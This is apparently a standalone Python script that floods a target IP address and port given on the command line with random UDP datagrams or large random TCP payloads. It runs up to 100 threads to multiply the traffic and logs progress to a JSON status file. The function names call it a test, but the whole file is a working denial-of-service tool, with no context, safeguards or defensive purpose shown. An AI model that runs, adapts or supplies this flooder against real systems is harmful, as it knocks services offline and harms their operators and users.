import socket
import sys
import os
import time
import json
import random
import concurrent.futures as CF

def writer():
  if not os.path.exists('temps/swifi.json'):
    with open('temps/swifi.json', 'w') as init_:
      init_.write('{}')
      init_.close()
      return True
  return True

def return_status(key,value):
  with open('temps/swifi.json', 'r') as swifi:
    edit = json.load(swifi)
    with open('temps/swifi.json', 'w') as rewrite:
      edit[key] = value      
      json.dump(edit,rewrite,indent=2)
      rewrite.close()
    swifi.close()
    
def send_udp(ip,port):
  udp_data = random._urandom(64500)
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock.sendto(udp_data, (ip, port))
  
  
def send_tcp(ip, port,cont=None):
  try:
    tcp_data = random._urandom(12048000)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip,port))
    i = 0
    if cont:
      while i <= 50:
        sock.sendall(tcp_data)
        i+=1
    sock.sendall(tcp_data)
    sock.close()
    return 'sent'
  except socket.gaierror:
    return 'No address associated with hostname'
  except Exception as errro:
    return str(errro)
      
def scale_horizontally(func, *args,threads=100,tasks=70,delay=0.5):
  try:
    with CF.ThreadPoolExecutor(max_workers=threads) as execute:
      for _ in range(tasks):
        result = execute.submit(func, *args)
        time.sleep(delay)
      return_status('status','completed')
  except KeyboardInterrupt:
    sys.exit()

def run_test(ip,port):
  writer()
  if str(sys.argv[3]) == "tcp":
    response = send_tcp(ip,port)
    if response == 'sent':
      return_status('status','sent')
      scale_horizontally(send_tcp, ip, port,cont=True)
    elif response == "No address associated with hostname":
      return_status('status','address not found')
    else:
      return_status('status','connection timeout')
  elif sys.argv[3] == "udp":
    scale_horizontally(send_udp, ip, port)
  else:
    print(f'Unrecognised arguement : {sys.argv[3]}')
    
if __name__=="__main__":
  try:
    if not len(sys.argv) > 1:
      sys.exit()
    else:
      run_test(sys.argv[1], int(sys.argv[2]))
  except KeyboardInterrupt:
    sys.exit()